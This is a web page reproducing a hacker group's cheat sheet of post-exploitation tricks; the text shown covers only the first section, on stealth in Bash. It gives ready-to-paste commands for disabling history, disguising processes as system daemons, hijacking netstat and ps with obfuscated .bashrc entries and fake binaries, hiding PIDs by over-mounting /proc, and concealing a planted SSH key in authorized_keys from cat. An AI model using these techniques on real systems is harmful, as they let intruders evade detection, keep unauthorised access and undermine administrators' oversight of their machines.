<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="readloud">
    
    <link rel="shortcut icon" href="../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>THC's favourite Tips, Tricks &amp; Hacks (Cheat Sheet) - readloud.org</title>
    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../js/jquery-3.2.1.min.js"></script>
    <script src="../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "THC\u0027s favourite Tips, Tricks \u0026amp; Hacks (Cheat Sheet)", url: "#_top", children: [
              {title: "1. Bash / Shell", url: "#1-bash-shell" },
              {title: "2. SSH", url: "#2-ssh" },
              {title: "3. Network", url: "#3-network" },
              {title: "4. Data Upload/Download/Exfil", url: "#4-data-uploaddownloadexfil" },
              {title: "5. Reverse Shell / Dumb Shell", url: "#5-reverse-shell-dumb-shell" },
              {title: "6. Backdoors", url: "#6-backdoors" },
              {title: "7. Host Recon", url: "#7-host-recon" },
              {title: "8. Shell Hacks", url: "#8-shell-hacks" },
              {title: "9. Crypto", url: "#9-crypto" },
              {title: "10. SSH Sniffing", url: "#10-ssh-sniffing" },
              {title: "11. VPN \u0026amp; Shells", url: "#11-vpn-shells" },
              {title: "12. Intelligence Gathering", url: "#12-intelligence-gathering" },
              {title: "13. Miscellaneous", url: "#13-miscellaneous" },
              {title: "14. Other Sites", url: "#14-other-sites" },
          ]},
        ];

    </script>
    <script src="../../js/base.js"></script>
      <script src="../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    

    <h1 id="thcs-favourite-tips-tricks-hacks-cheat-sheet">THC's favourite Tips, Tricks &amp; Hacks (Cheat Sheet)</h1>
<p>https://thc.org/tips<br />
https://tinyurl.com/thctips</p>
<p><a href="THCsfavouriteTipsTricks%26Hacks.zip">THCsfavouriteTipsTricks&amp;Hacks.zip</a></p>
<p>A collection of our favourite tricks. Many of those tricks are not from us. We merely collect them.</p>
<p>We show the tricks 'as is' without any explanation why they work. You need to know Linux to understand how and why they work.</p>
<p>Got tricks? Join us on Telegram: <a href="https://t.me/thcorg">https://t.me/thcorg</a></p>
<ol>
<li><a href="#bash">Bash</a></li>
<li><a href="#bash-no-history">Leave Bash without history</a></li>
<li><a href="#bash-hide-command">Hide your commands</a></li>
<li><a href="#zap">Hide your command line options</a></li>
<li><a href="#bash-hide-connection">Hide a network connection</a></li>
<li><a href="#hide-a-process-user">Hide a process as user</a></li>
<li><a href="#hide-a-process-root">Hide a process as root</a></li>
<li><a href="#hide-scripts">Hide scripts</a></li>
<li><a href="#cat">Hide from cat</a></li>
<li><a href="#parallel">Execute in parrallel with separate logfiles</a></li>
<li><a href="#ssh">SSH</a></li>
<li><a href="#ssh-invisible">Almost invisible SSH</a></li>
<li><a href="#ssh-master">Multiple shells via 1 SSH/TCP connection</a></li>
<li><a href="#ssh-tunnel">SSH tunnel</a></li>
<li><a href="#ssh-socks-tunnel">SSH socks5 tunnel</a></li>
<li><a href="#ssh-j">SSH to NATed host</a></li>
<li><a href="#ssh-pj">SSH pivot via ProxyJump</a></li>
<li><a href="#sshd-user">SSHD as user</a></li>
<li><a href="#network">Network</a></li>
<li><a href="#discover">Discover hosts</a></li>
<li><a href="#tcpdump">Tcpdump</a></li>
<li><a href="#tunnel">Tunnel and forwarding</a><ol>
<li><a href="#ports">Raw TCP reverse ports</a></li>
<li><a href="#https">HTTPS reverse forwards</a></li>
<li><a href="#iptables">Bouncing traffic with iptables</a></li>
<li><a href="#ghost">Ghost IP / IP Spoofing</a></li>
</ol>
</li>
<li><a href="#scan-proxy">Use any tool via Socks Proxy</a></li>
<li><a href="#your-ip">Find your public IP address</a></li>
<li><a href="#check-reachable">Check reachability from around the world</a></li>
<li><a href="#check-open-ports">Check/Scan Open Ports</a></li>
<li><a href="#bruteforce">Crack Passwords hashes</a></li>
<li><a href="#bruteforce">Brute Force Passwords / Keys</a></li>
<li><a href="#exfil">Data Upload/Download/Exfil</a></li>
<li><a href="#file-encoding">File Encoding/Decoding</a></li>
<li><a href="#cut-paste">File transfer using cut &amp; paste</a></li>
<li><a href="#file-transfer-screen">File transfer using screen</a></li>
<li><a href="#file-transfer-gs-netcat">File transfer using gs-netcat and sftp</a></li>
<li><a href="#http">File transfer using HTTP</a></li>
<li><a href="#burl">File transfer without curl</a></li>
<li><a href="#rsync">File transfer using rsync</a></li>
<li><a href="#trans">File transfer to public dump sites</a> </li>
<li><a href="#webdav">File transfer using WebDAV</a></li>
<li><a href="#tg">File transfer to Telegram</a> </li>
<li><a href="#reverse-shell">Reverse Shell / Dumb Shell</a></li>
<li><a href="#reverse-shell">Reverse Shells</a><ol>
<li><a href="#reverse-shell-gs-netcat">with gs-netcat (encrypted)</a></li>
<li><a href="#reverse-shell-bash">with Bash</a></li>
<li><a href="#curlshell">with cURL (encrypted)</a></li>
<li><a href="#curltelnet">with cURL (cleartext)</a></li>
<li><a href="#sslshell">with OpenSSL (encrypted)</a></li>
<li><a href="#revese-shell-remote-moe">with remote.moe (encrypted)</a></li>
<li><a href="#reverse-shell-no-bash">without /dev/tcp</a></li>
<li><a href="#reverse-shell-python">with Python</a></li>
<li><a href="#reverse-shell-perl">with Perl</a></li>
<li><a href="#reverse-shell-php">with PHP</a></li>
</ol>
</li>
<li><a href="#reverse-shell-upgrade">Upgrading the dumb shell</a><ol>
<li><a href="#reverse-shell-pty">Upgrade a reverse shell to a pty shell</a></li>
<li><a href="#reverse-shell-interactive">Upgrade a reverse shell to a fully interactive shell</a></li>
<li><a href="#reverse-shell-socat">Reverse shell with socat (fully interactive)</a></li>
</ol>
</li>
<li><a href="#backdoor">Backdoors</a></li>
<li><a href="#backdoor-background-reverse-shell">Background reverse shell</a></li>
<li><a href="#backdoor-auth-keys">authorized_keys</a></li>
<li><a href="#backdoor-network">Remote access an entire network</a></li>
<li><a href="#carriage-return-backdoor">Smallest PHP backdoor</a> </li>
<li><a href="#ld-backdoor">Local Root backdoor</a></li>
<li><a href="#hostrecon">Host Recon</a></li>
<li><a href="#shell-hacks">Shell Hacks</a></li>
<li><a href="#shred">Shred files (secure delete)</a></li>
<li><a href="#restore-timestamp">Restore the date of a file</a></li>
<li><a href="#shell-clean-logs">Clean logfile</a></li>
<li><a href="#shell-hide-files">Hide files from a User without root privileges</a></li>
<li><a href="#perm-files">Make a file immutable</a></li>
<li><a href="#nosudo">Change user without sudo/su</a></li>
<li><a href="#crypto">Crypto</a></li>
<li><a href="#gen-password">Generate quick random Password</a></li>
<li><a href="#crypto-filesystem">Linux transportable encrypted filesystems</a><ol>
<li><a href="#crypto-filesystem">cryptsetup</a></li>
<li><a href="#encfs">EncFS</a></li>
</ol>
</li>
<li><a href="#encrypting-file">Encrypting a file</a></li>
<li><a href="#ssh-sniffing">SSH session sniffing and hijacking</a></li>
<li><a href="#ssh-sniffing-script">Sniff a user's SHELL session with script</a></li>
<li><a href="#dtrace">Sniff all SHELL sessions with dtrace</a></li>
<li><a href="#bpf">Sniff all SHELL sessions with eBPF</a></li>
<li><a href="#ssh-sniffing-strace">Sniff a user's outgoing SSH session with strace</a></li>
<li><a href="#ssh-sniffing-wrapper">Sniff a user's outgoing SSH session with a wrapper script</a></li>
<li><a href="#ssh-sniffing-sshit">Sniff a user's outgoing SSH session with SSH-IT</a></li>
<li><a href="#hijack">Hijack / Take-over a running SSH session</a></li>
<li><a href="#vpn-shell">VPN and Shells</a></li>
<li><a href="#shell">Disposable Root Servers</a></li>
<li><a href="#vpn">VPN/VPS Providers</a></li>
<li><a href="#osint">OSINT Intelligence Gathering</a></li>
<li><a href="#misc">Miscellaneous</a></li>
<li><a href="#tools">Tools of the trade</a></li>
<li><a href="#cool-linux-commands">Cool Linux commands</a></li>
<li><a href="#tmux">tmux Cheat Sheet</a></li>
<li><a href="#useful-commands">Useful commands</a></li>
<li><a href="#others">Other Sites</a></li>
</ol>
<hr />
<p><a id="bash"></a></p>
<h2 id="1-bash-shell">1. Bash / Shell</h2>
<p><a id="bash-no-history"></a>
<strong>1.i. Leave Bash without history:</strong></p>
<p>Tell Bash to use <em>/dev/null</em> instead of <em>~/.bash_history</em>. This is the first command we execute on every shell. It will stop the Bash from logging your commands. </p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">HISTFILE</span><span class="o">=</span>/dev/null
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="nb">unset</span><span class="w"> </span>SSH_CONNECTION<span class="w"> </span>SSH_CLIENT
</span></code></pre></div>
<p>(We also clear SSH_* variables in case we logged in with SSH. Otherwise any process we start gets a copy of our IP in /proc/self/environ.)</p>
<p>It is good housekeeping to 'commit suicide' when exiting a shell:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nb">alias</span><span class="w"> </span><span class="nv">exit</span><span class="o">=</span><span class="s1">&#39;kill -9 $$&#39;</span>
</span></code></pre></div></p>
<p>Any command starting with a " " (space) will <a href="https://unix.stackexchange.com/questions/115917/why-is-bash-not-storing-commands-that-start-with-spaces">not get logged to history</a> either.
<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>$  id
</span></code></pre></div></p>
<p><a id="bash-hide-command"></a>
<strong>1.ii. Hide your command / Daemonzie your command</strong></p>
<p>Hide as "syslogd".</p>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="o">(</span><span class="nb">exec</span><span class="w"> </span>-a<span class="w"> </span>syslogd<span class="w"> </span>nmap<span class="w"> </span>-T0<span class="w"> </span><span class="m">10</span>.0.2.1/24<span class="o">)</span><span class="w"> </span><span class="c1"># Note the brackets &#39;(&#39; and &#39;)&#39;</span>
</span></code></pre></div>
<p>Start a background hidden process:
<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>(exec -a syslogd nmap -T0 10.0.2.1/24 &amp;&gt;nmap.log &amp;)
</span></code></pre></div></p>
<p>Start within a <a href="https://linux.die.net/man/1/screen">GNU screen</a>:
<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>screen -dmS MyName nmap -T0 10.0.2.1/24
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>### Attach back to the nmap process
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>screen -x MyName
</span></code></pre></div></p>
<p>Alternatively if there is no Bash:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>cp<span class="w"> </span><span class="s2">&quot;</span><span class="k">$(</span><span class="nb">command</span><span class="w"> </span>-v<span class="w"> </span>nmap<span class="k">)</span><span class="s2">&quot;</span><span class="w"> </span>syslogd
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="nv">PATH</span><span class="o">=</span>.:<span class="nv">$PATH</span><span class="w"> </span>syslogd<span class="w"> </span>-T0<span class="w"> </span><span class="m">10</span>.0.2.1/24
</span></code></pre></div>
In this example we execute <em>nmap</em> but let it appear with the name <em>syslogd</em> in <em>ps alxwww</em> process list.</p>
<p><a id="zap"></a>
<strong>1.iii. Hide your command line options</strong></p>
<p>Use <a href="https://github.com/hackerschoice/zapper">zapper</a>:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1"># Start Nmap but zap all options and show it as &#39;klog&#39; in the process list:</span>
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>./zapper<span class="w"> </span>-a<span class="w"> </span>klog<span class="w"> </span>nmap<span class="w"> </span>-T0<span class="w"> </span><span class="m">10</span>.0.0.1/24
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="c1"># Same but started as a daemon:</span>
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="o">(</span>./zapper<span class="w"> </span>-a<span class="w"> </span>klog<span class="w"> </span>nmap<span class="w"> </span>-T0<span class="w"> </span><span class="m">10</span>.0.0.1/24<span class="w"> </span><span class="p">&amp;</span>&gt;nmap.log<span class="w"> </span><span class="p">&amp;</span><span class="o">)</span>
</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="c1"># Replace the existing shell with tmux (with &#39;exec&#39;).</span>
</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="c1"># Then start and hide tmux and all further processes - as some kernel process:</span>
</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="nb">exec</span><span class="w"> </span>./zapper<span class="w"> </span>-f<span class="w"> </span>-a<span class="s1">&#39;[kworker/1:0-rcu_gp]&#39;</span><span class="w"> </span>tmux
</span></code></pre></div></p>
<p><a id="bash-hide-connection"></a>
<strong>1.iv. Hide a Network Connection</strong></p>
<p>The trick is to hijack <code>netstat</code> and use grep to filter out our connection. This example filters any connection on port 31337 <em>or</em> ip 1.2.3.4. The same should be done for <code>ss</code> (a netstat alternative).</p>
<p><strong>Method 1 - Hiding a connection with bash-function in ~/.bashrc</strong></p>
<p>Cut &amp; paste this to add the line to ~/.bashrc
<div class="language-shell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;netstat(){ command netstat &quot;$@&quot; | grep -Fv -e :31337 -e 1.2.3.4; }&#39;</span><span class="w"> </span>&gt;&gt;~/.bashrc<span class="w"> </span><span class="se">\</span>
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="o">&amp;&amp;</span><span class="w"> </span>touch<span class="w"> </span>-r<span class="w"> </span>/etc/passwd<span class="w"> </span>~/.bashrc
</span></code></pre></div></p>
<p>Or cut &amp; paste this for an obfuscated entry to ~/.bashrc:
<div class="language-shell highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nv">X</span><span class="o">=</span><span class="s1">&#39;netstat(){ command netstat &quot;$@&quot; | grep -Fv -e :31337 -e 1.2.3.4; }&#39;</span>
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;eval \$(echo </span><span class="k">$(</span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$X</span><span class="s2">&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>xxd<span class="w"> </span>-ps<span class="w"> </span>-c1024<span class="k">)</span><span class="s2">|xxd -r -ps) #Initialize PRNG&quot;</span><span class="w"> </span>&gt;&gt;~/.bashrc<span class="w"> </span><span class="se">\</span>
</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="o">&amp;&amp;</span><span class="w"> </span>touch<span class="w"> </span>-r<span class="w"> </span>/etc/passwd<span class="w"> </span>~/.bashrc
</span></code></pre></div></p>
<p>The obfuscated entry to ~/.bashrc will look like this:
<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>eval $(echo 6e65747374617428297b20636f6d6d616e64206e6574737461742022244022207c2067726570202d4676202d65203a3331333337202d6520312e322e332e343b207d0a|xxd -r -ps) #Initialize PRNG
</span></code></pre></div></p>
<p><strong>Method 2 - Hiding a connection with a binary in $PATH</strong></p>
<p>Create a fake netstat binary in /usr/local/sbin. On a default Debian (and most Linux) the PATH variables (<code>echo $PATH</code>) lists /usr/local/sbin <em>before</em> /usr/bin. This means that our hijacking binary /usr/local/sbin/netstat will be executed instead of /usr/bin/netstat.</p>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;#! /bin/bash</span>
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="s2">exec /usr/bin/netstat \&quot;\$@\&quot; | grep -Fv -e :22 -e 1.2.3.4&quot;</span><span class="w"> </span>&gt;/usr/local/sbin/netstat<span class="w"> </span><span class="se">\</span>
</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="o">&amp;&amp;</span><span class="w"> </span>chmod<span class="w"> </span><span class="m">755</span><span class="w"> </span>/usr/local/sbin/netstat<span class="w"> </span><span class="se">\</span>
</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="o">&amp;&amp;</span><span class="w"> </span>touch<span class="w"> </span>-r<span class="w"> </span>/usr/bin/netstat<span class="w"> </span>/usr/local/sbin/netstat
</span></code></pre></div>
<p><em>(thank you iamaskid)</em></p>
<p><a id="hide-a-process-user"></a>
<strong>1.v. Hide a process as user</strong></p>
<p>Continuing from "Hiding a connection" the same technique can be used to hide a process. This example hides the nmap process and also takes care that our <code>grep</code> does not show up in the process list by renaming it to GREP:</p>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;ps(){ command ps &quot;$@&quot; | exec -a GREP grep -Fv -e nmap  -e GREP; }&#39;</span><span class="w"> </span>&gt;&gt;~/.bashrc<span class="w"> </span><span class="se">\</span>
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="o">&amp;&amp;</span><span class="w"> </span>touch<span class="w"> </span>-r<span class="w"> </span>/etc/passwd<span class="w"> </span>~/.bashrc
</span></code></pre></div>
<p><a id="hide-a-process-root"></a>
<strong>1.vi. Hide a process as root</strong></p>
<p>This requires root privileges and is an old Linux trick by over-mounting /proc/&lt;pid&gt; with a useless directory:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>hide<span class="o">()</span>
</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="o">{</span>
</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="w">    </span><span class="o">[[</span><span class="w"> </span>-L<span class="w"> </span>/etc/mtab<span class="w"> </span><span class="o">]]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">{</span><span class="w"> </span>cp<span class="w"> </span>/etc/mtab<span class="w"> </span>/etc/mtab.bak<span class="p">;</span><span class="w"> </span>mv<span class="w"> </span>/etc/mtab.bak<span class="w"> </span>/etc/mtab<span class="p">;</span><span class="w"> </span><span class="o">}</span>
</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="w">    </span><span class="nv">_pid</span><span class="o">=</span><span class="si">${</span><span class="nv">1</span><span class="k">:-</span><span class="nv">$$</span><span class="si">}</span>
</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="w">    </span><span class="o">[[</span><span class="w"> </span><span class="nv">$_pid</span><span class="w"> </span><span class="o">=</span>~<span class="w"> </span>^<span class="o">[</span><span class="m">0</span>-9<span class="o">]</span>+$<span class="w"> </span><span class="o">]]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">{</span><span class="w"> </span>mount<span class="w"> </span>-n<span class="w"> </span>--bind<span class="w"> </span>/dev/shm<span class="w"> </span>/proc/<span class="nv">$_pid</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[THC] PID </span><span class="nv">$_pid</span><span class="s2"> is now hidden&quot;</span><span class="p">;</span><span class="w"> </span><span class="k">return</span><span class="p">;</span><span class="w"> </span><span class="o">}</span>
</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="w">    </span><span class="nb">local</span><span class="w"> </span>_argstr
</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span>_x<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="p">@:</span><span class="nv">2</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="nv">_argstr</span><span class="o">+=</span><span class="s2">&quot; &#39;</span><span class="si">${</span><span class="nv">_x</span><span class="p">//</span><span class="se">\&#39;</span><span class="p">/</span><span class="se">\&#39;\&quot;\&#39;\&quot;\&#39;</span><span class="si">}</span><span class="s2">&#39;&quot;</span><span class="p">;</span><span class="w"> </span><span class="k">done</span>
</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="w">    </span><span class="o">[[</span><span class="w"> </span><span class="k">$(</span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;ps -o stat= -p \$\$&quot;</span><span class="k">)</span><span class="w"> </span><span class="o">=</span>~<span class="w"> </span><span class="se">\+</span><span class="w"> </span><span class="o">]]</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nb">exec</span><span class="w"> </span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;mount -n --bind /dev/shm /proc/\$\$; exec \&quot;</span><span class="nv">$1</span><span class="s2">\&quot; </span><span class="nv">$_argstr</span><span class="s2">&quot;</span>
</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a><span class="w">    </span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;mount -n --bind /dev/shm /proc/\$\$; exec \&quot;</span><span class="nv">$1</span><span class="s2">\&quot; </span><span class="nv">$_argstr</span><span class="s2">&quot;</span>
</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="o">}</span>
</span></code></pre></div></p>
<p>To hide a command use:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>hide<span class="w">                                 </span><span class="c1"># Hides the current shell/PID</span>
</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>hide<span class="w"> </span><span class="m">31337</span><span class="w">                           </span><span class="c1"># Hides process with pid 31337</span>
</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>hide<span class="w"> </span>sleep<span class="w"> </span><span class="m">1234</span><span class="w">                      </span><span class="c1"># Hides &#39;sleep 1234&#39;</span>
</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>hide<span class="w"> </span>nohup<span class="w"> </span>sleep<span class="w"> </span><span class="m">1234</span><span class="w"> </span><span class="p">&amp;</span>&gt;/dev/null<span class="w"> </span><span class="p">&amp;</span><span class="w">  </span><span class="c1"># Starts and hides &#39;sleep 1234&#39; as a background process</span>
</span></code></pre></div></p>
<p>(thanks to <em>druichi</em> for improving this)</p>
<p><a id="hide-scripts"></a>
<strong>1.vii. Hide shell scripts</strong></p>
<p>Above we discussed how to obfuscate a line in ~/.bashrc. An often used trick is to use <code>source</code> instead. The source command can be shortened to <code>.</code> (yes, a dot) <em>and</em> it also searches through the $PATH variable to find the file to load.</p>
<p>In this example our script <code>prng</code> contains all of our shell functions from above. Those functions hide the <code>nmap</code> process and the network connection. Last we add <code>. prng</code> into the systemwide rc file. This will load <code>prng</code> when the user (and root) logs in:</p>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s1">&#39;netstat(){ command netstat &quot;$@&quot; | grep -Fv -e :31337 -e 1.2.3.4; }</span>
</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="s1">ps(){ command ps &quot;$@&quot; | exec -a GREP grep -Fv -e nmap  -e GREP; }&#39;</span><span class="w"> </span>&gt;/usr/bin/prng<span class="w"> </span><span class="se">\</span>
</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;. prng #Initialize Pseudo Random Number Generator&quot;</span><span class="w"> </span>&gt;&gt;/etc/bash.bashrc<span class="w"> </span><span class="se">\</span>
</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="o">&amp;&amp;</span><span class="w"> </span>touch<span class="w"> </span>-r<span class="w"> </span>/etc/ld.so.conf<span class="w"> </span>/usr/bin/prng<span class="w"> </span>/etc/bash.bashrc
</span></code></pre></div>
<p>(The same works for <code>lsof</code>, <code>ss</code> and <code>ls</code>)</p>
<p><a id="cat"></a>
<strong>1.viii. Hide from cat</strong></p>
<p>ANSI escape characters or a simple <code>\r</code> (<a href="https://www.hahwul.com/2019/01/23/php-hidden-webshell-with-carriage/">carriage return</a>) can be used to hide from <code>cat</code> and others.</p>
<p>Hide the last command (example: <code>id</code>) in <code>~/.bashrc</code>:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;id #\\033[2K\\033[1A&quot;</span><span class="w"> </span>&gt;&gt;~/.bashrc
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="c1">### The ANSI escape sequence \\033[2K erases the line. The next sequence \\033[1A</span>
</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="c1">### moves the cursor 1 line up.</span>
</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="c1">### The &#39;#&#39; after the command &#39;id&#39; is a comment and is needed so that bash still</span>
</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="c1">### executes the &#39;id&#39; but ignores the two ANSI escape sequences.</span>
</span></code></pre></div>
Note: We use <code>echo -e</code> to convert <code>\\033</code> to the ANSI escape character (hex 0x1b).</p>
<p>Adding a <code>\r</code> (carriage return) goes a long way to hide your ssh key from <code>cat</code>:
<div class="language-shell highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;ssh-ed25519 AAAAOurPublicKeyHere....blah x@y&quot;</span><span class="s1">$&#39;\r&#39;</span><span class="s2">&quot;</span><span class="k">$(</span>&lt;authorized_keys<span class="k">)</span><span class="s2">&quot;</span><span class="w"> </span>&gt;authorized_keys
</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="c1">### This adds our key as the first key and &#39;cat authorized_keys&#39; wont show</span>
</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="c1">### it. The $&#39;\r&#39; is a bash special to create a \r (carriage return).</span>
</span></code></pre></div></p>
<p><a id="parallel"></a>
